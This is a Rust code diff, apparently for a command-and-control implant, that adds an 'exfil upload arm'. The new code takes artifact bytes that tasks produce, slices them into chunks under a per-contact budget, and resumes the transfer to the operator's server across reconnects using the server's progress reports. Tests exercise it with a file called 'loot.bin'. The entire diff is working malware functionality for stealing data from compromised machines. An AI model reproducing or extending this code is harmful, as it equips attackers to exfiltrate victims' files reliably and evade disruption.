@@ -4,14 +4,14 @@ use std::collections::BTreeMap;
 
 use crate::channel::{self, Channels};
 use crate::envelope;
-use crate::handlers::{self, Cadence, Outcome};
+use crate::handlers::{self, ArtifactRun, Cadence, Outcome};
 use crate::outbox::Outbox;
 use crate::plugins::Plugins;
 use crate::trust::Certificate;
 use crate::verify::{self, NonceTracker, Verdict};
 use crate::wire::{
-    ChannelOutput, Frame, FrameKind, HandshakeRequest, HandshakeResponse, ProtocolVersion,
-    StagedChunk, StagedPull, TaskRequest,
+    ChannelOutput, ExfilChunk, Frame, FrameKind, HandshakeRequest, HandshakeResponse,
+    ProtocolVersion, StagedChunk, StagedPull, TaskRequest,
 };
 
 /// One staged task's transfer state (ADR-010): the tasking, the bytes an
@@ -34,6 +34,42 @@ struct StagedPending {
 /// surfaces on the task instead of parking it forever.
 const STAGED_IDLE_CYCLES: u32 = 3;
 
+/// One exfil upload run (ADR-010's upload arm): the artifact bytes a task
+/// produced, held on the session until the server reports the run landed --
+/// `StagedPending`'s upload mirror, so the run survives carriage switches,
+/// reconnects, and failed contacts. The carriages slice it per contact under
+/// the body budget; the seam reports move `confirmed` (ahead or back), and a
+/// report at the run's end retires it.
+struct ExfilRun {
+    task: String,
+    name: String,
+    content_type: String,
+    data: Vec<u8>,
+    /// The SHA-256 of the whole run: the declared hash every slice carries.
+    sha: Vec<u8>,
+    /// Bytes the server's last report held: the seam every contact serves
+    /// from. Optimistic sends never move it -- only a report does, so a
+    /// contact that dies mid-flight re-sends from the last confirmed seam.
+    confirmed: usize,
+    last_confirmed: usize,
+    idle_cycles: u32,
+}
+
+/// Cycles an upload run may make no progress before the session drops it:
+/// the task's result already crossed, so the honest end of a run the server
+/// never reports on is losing the artifact, not parking its bytes forever.
+const EXFIL_IDLE_CYCLES: u32 = 3;
+
+/// The frame carriages' slice size: the same 512 KiB budget the chunker
+/// always ran, under the frame-layer sizing rule.
+const EXFIL_CHUNK_BYTES: usize = 512 * 1024;
+
+/// The exfil byte budget one contact carries: the envelope's body cap is
+/// 16 MiB of wire bytes (base64-expanded when sealed), so the run's slices
+/// leave room for the handshake, results, and demands beside them. A run
+/// larger than this spans contacts -- that spanning is the arm's point.
+pub const EXFIL_CONTACT_BUDGET: usize = 8 * 1024 * 1024;
+
 /// Everything a contact carriage needs to serve one run: identity, the
 /// advertisement, the live cadence, the seal, the signer pool, and the
 /// cross-carriage task state (nonce floor, ledger, batch, staged transfers).
@@ -53,6 +89,7 @@ pub struct Session {
     pub outbox: Outbox,
     pub channels: Channels,
     staged: BTreeMap<String, StagedPending>,
+    exfil: Vec<ExfilRun>,
     contact_counter: u64,
 }
 
@@ -134,6 +171,7 @@ impl Session {
             outbox: Outbox::default(),
             channels: Channels::new(),
             staged: BTreeMap::new(),
+            exfil: Vec::new(),
             contact_counter: 0,
         }
     }
@@ -291,20 +329,19 @@ impl Session {
                         .spawn(&task.verb, &task.task_id, &task.arguments);
                     return;
                 }
-                // Dispatch runs exactly once: the result and its out-of-band
-                // chunks both come off this one execution. A module.load
-                // that succeeded widened the plugin table's routes, so the
-                // advertisement syncs right behind it.
+                // Dispatch runs exactly once: the result and its artifact
+                // run both come off this one execution. A module.load that
+                // succeeded widened the plugin table's routes, so the
+                // advertisement syncs right behind it. The run registers on
+                // the session (the upload arm's state) instead of queueing
+                // frames -- the carriages slice it per contact and resume it
+                // from the server's seam reports (ADR-010).
                 let handler =
                     handlers::dispatch(&task.verb, &task.arguments, &self.cadence, &self.plugins);
                 self.outbox
                     .result(&task.task_id, handler.outcome, &handler.output);
-                for mut chunk in handler.chunks {
-                    chunk.task_id = task.task_id.clone();
-                    self.outbox.queue(Frame {
-                        payload: chunk.encode_to_vec(),
-                        kind: FrameKind::ExfilChunk as i32,
-                    });
+                if let Some(run) = handler.artifact {
+                    self.register_exfil(&task.task_id, run);
                 }
                 self.sync_module_advertisements();
             }
@@ -559,6 +596,104 @@ impl Session {
         }
     }
 
+    // --- The exfil upload state (ADR-010): registration, per-contact
+    // slicing, and the seam reports -- the staged transfer state's upload
+    // mirror, one implementation every carriage shares.
+
+    /// Registers a completed handler's artifact run. Idempotent per task by
+    /// dispatch's own single-run guarantee.
+    fn register_exfil(&mut self, task: &str, run: ArtifactRun) {
+        let sha = Sha256::digest(&run.data).to_vec();
+        self.exfil.push(ExfilRun {
+            task: task.to_string(),
+            name: run.name,
+            content_type: run.content_type,
+            data: run.data,
+            sha,
+            confirmed: 0,
+            last_confirmed: 0,
+            idle_cycles: 0,
+        });
+    }
+
+    /// The slice frames this contact carries: each pending run serves from
+    /// its confirmed seam within the budget, every slice at its absolute
+    /// offset with the run's declared hash. Regenerated every cycle -- a
+    /// contact that dies mid-flight never moved the seam, so the next one
+    /// re-sends exactly the unconfirmed slices (placement is idempotent
+    /// server-side, so a duplicate is a no-op, not corruption).
+    pub fn exfil_frames(&mut self, budget: usize) -> Vec<Frame> {
+        let mut frames = Vec::new();
+        let mut budget = budget;
+        for run in &mut self.exfil {
+            let mut at = run.confirmed;
+            while at < run.data.len() && budget > 0 {
+                let take = EXFIL_CHUNK_BYTES.min(run.data.len() - at).min(budget);
+                let terminal = at + take == run.data.len();
+                frames.push(Frame {
+                    payload: ExfilChunk {
+                        task_id: run.task.clone(),
+                        name: run.name.clone(),
+                        content_type: run.content_type.clone(),
+                        sequence: (at / EXFIL_CHUNK_BYTES) as u64,
+                        terminal,
+                        offset: Some(at as u64),
+                        payload_sha256: Some(run.sha.clone()),
+                        data: run.data[at..at + take].to_vec(),
+                    }
+                    .encode_to_vec(),
+                    kind: FrameKind::ExfilChunk as i32,
+                });
+                at += take;
+                budget -= take;
+            }
+        }
+        frames
+    }
+
+    /// Whether any upload run is still owed -- the live carriage's tick-arm
+    /// signal, so a run keeps slicing while the connection parks.
+    pub fn exfil_pending(&self) -> bool {
+        !self.exfil.is_empty()
+    }
+
+    /// One seam report (an ExfilProgress frame): the server's held count is
+    /// authoritative in both directions -- ahead, the next contact serves
+    /// from the new seam; behind (an evicted or restarted server), the run
+    /// rewinds and re-serves from the named bytes. A report at or past the
+    /// run's end retires it: the artifact landed.
+    pub fn exfil_progress(&mut self, task: &str, name: &str, held: u64) {
+        self.exfil.retain_mut(|run| {
+            if run.task != task || run.name != name {
+                return true;
+            }
+            if held as usize >= run.data.len() {
+                return false;
+            }
+            run.confirmed = held as usize;
+            true
+        });
+    }
+
+    /// The cycle boundary's no-progress guard, the staged transfer's own
+    /// shape: a run whose seam never moved counts an idle cycle, and one
+    /// idle past the bound is dropped -- the artifact is lost, but the
+    /// session does not carry it forever.
+    pub fn exfil_cycle_end(&mut self) {
+        self.exfil.retain_mut(|run| {
+            if run.confirmed > run.last_confirmed {
+                run.last_confirmed = run.confirmed;
+                run.idle_cycles = 0;
+                true
+            } else if run.idle_cycles + 1 >= EXFIL_IDLE_CYCLES {
+                false
+            } else {
+                run.idle_cycles += 1;
+                true
+            }
+        });
+    }
+
     /// Moves the channel layer's produce into the batch: output chunks queue
     /// as ChannelOutput frames (upstream under the same seal and counter as
     /// every other frame), and a finished channel reports its task like any
@@ -593,7 +728,7 @@ impl Session {
 #[cfg(test)]
 mod tests {
     use super::*;
-    use crate::wire::{HandshakeRequest, HandshakeResponse, TaskResult};
+    use crate::wire::{ExfilChunk, HandshakeRequest, HandshakeResponse, TaskResult};
     use rsa::pkcs8::EncodePublicKey;
     use rsa::signature::{RandomizedSigner, SignatureEncoding};
 
@@ -897,10 +1032,7 @@ mod tests {
         let resumed = session.staged_demands();
         let pull = StagedPull::decode(resumed[0].payload.as_ref()).expect("the demand decodes");
         assert_eq!(pull.offset, Some(1000));
-        assert_eq!(
-            pull.prefix_sha256.as_deref(),
-            Some(expected_proof.as_ref())
-        );
+        assert_eq!(pull.prefix_sha256.as_deref(), Some(expected_proof.as_ref()));
         session.accept_staged_chunk(&chunk("st-1", 0, 1000, true, &payload[1000..]));
         assert!(!session.staged_holds("st-1"));
 
@@ -1002,5 +1134,113 @@ mod tests {
             ));
         }
         assert!(growing.staged_holds("st-1"));
+    }
+
+    /// A session with one registered upload run, sliced as the carriages
+    /// slice it.
+    fn exfil_session(data: &[u8]) -> Session {
+        let mut session = bare_session(None);
+        session.register_exfil(
+            "t-1",
+            ArtifactRun {
+                name: "loot.bin".into(),
+                content_type: "application/octet-stream".into(),
+                data: data.to_vec(),
+            },
+        );
+        session
+    }
+
+    fn decode_exfil(frame: &Frame) -> ExfilChunk {
+        ExfilChunk::decode(frame.payload.as_ref()).expect("the slice decodes")
+    }
+
+    #[test]
+    fn upload_runs_slice_under_the_budget_and_resume_from_reports() {
+        let data: Vec<u8> = (0..(EXFIL_CHUNK_BYTES * 2 + 100) as u32)
+            .map(|i| (i % 251) as u8)
+            .collect();
+        let mut session = exfil_session(&data);
+        let declared = Sha256::digest(&data).to_vec();
+
+        // One contact admits two full slices under the budget; every slice
+        // carries its absolute offset and the run's declared hash.
+        let first = session.exfil_frames(EXFIL_CHUNK_BYTES * 2);
+        assert_eq!(first.len(), 2);
+        let a = decode_exfil(&first[0]);
+        let b = decode_exfil(&first[1]);
+        assert_eq!(a.offset, Some(0));
+        assert_eq!(b.offset, Some(EXFIL_CHUNK_BYTES as u64));
+        assert!(!a.terminal);
+        assert!(!b.terminal);
+        assert_eq!(a.payload_sha256.as_deref(), Some(declared.as_slice()));
+
+        // The report moves the seam; the next contact serves only the
+        // remainder -- a full slice plus the byte tail, terminal on the
+        // tail.
+        session.exfil_progress("t-1", "loot.bin", EXFIL_CHUNK_BYTES as u64);
+        let second = session.exfil_frames(EXFIL_CONTACT_BUDGET);
+        assert_eq!(second.len(), 2);
+        let c = decode_exfil(&second[0]);
+        let d = decode_exfil(&second[1]);
+        assert_eq!(c.offset, Some(EXFIL_CHUNK_BYTES as u64));
+        assert!(!c.terminal);
+        assert_eq!(d.offset, Some((2 * EXFIL_CHUNK_BYTES) as u64));
+        assert!(d.terminal);
+        assert_eq!(d.data.len(), 100);
+
+        // A report at the run's end retires it.
+        session.exfil_progress("t-1", "loot.bin", data.len() as u64);
+        assert!(!session.exfil_pending());
+        assert!(session.exfil_frames(EXFIL_CONTACT_BUDGET).is_empty());
+    }
+
+    #[test]
+    fn a_missing_report_re_sends_from_the_last_confirmed_seam() {
+        // A contact that died in flight never moved the seam: the next
+        // contact re-sends the same slices (a duplicate is a no-op
+        // server-side).
+        let data = vec![5u8; EXFIL_CHUNK_BYTES + 32];
+        let mut session = exfil_session(&data);
+        let _ = session.exfil_frames(EXFIL_CONTACT_BUDGET);
+        let again = session.exfil_frames(EXFIL_CONTACT_BUDGET);
+        let slice = decode_exfil(&again[0]);
+        assert_eq!(slice.offset, Some(0));
+    }
+
+    #[test]
+    fn a_rewinding_report_re_serves_from_the_named_seam() {
+        // An evicted or restarted server reports fewer bytes than were sent:
+        // the run rewinds to the report and re-serves from there.
+        let data = vec![9u8; EXFIL_CHUNK_BYTES * 2];
+        let mut session = exfil_session(&data);
+        let _ = session.exfil_frames(EXFIL_CONTACT_BUDGET);
+        session.exfil_progress("t-1", "loot.bin", 0);
+        let resent = session.exfil_frames(EXFIL_CONTACT_BUDGET);
+        assert_eq!(resent.len(), 2);
+        assert_eq!(decode_exfil(&resent[0]).offset, Some(0));
+    }
+
+    #[test]
+    fn the_no_progress_guard_drops_a_stalled_run() {
+        let data = vec![3u8; 64];
+        let mut session = exfil_session(&data);
+        // Slices cross but no report ever comes: three idle cycles drop the
+        // run -- the artifact is lost, the session does not carry it.
+        for _ in 0..2 {
+            session.exfil_cycle_end();
+            assert!(session.exfil_pending());
+        }
+        session.exfil_cycle_end();
+        assert!(!session.exfil_pending());
+
+        // A report between cycles keeps the run alive.
+        let mut growing = exfil_session(&data);
+        growing.exfil_progress("t-1", "loot.bin", 32);
+        growing.exfil_cycle_end();
+        for _ in 0..2 {
+            growing.exfil_cycle_end();
+        }
+        assert!(growing.exfil_pending());
     }
 }
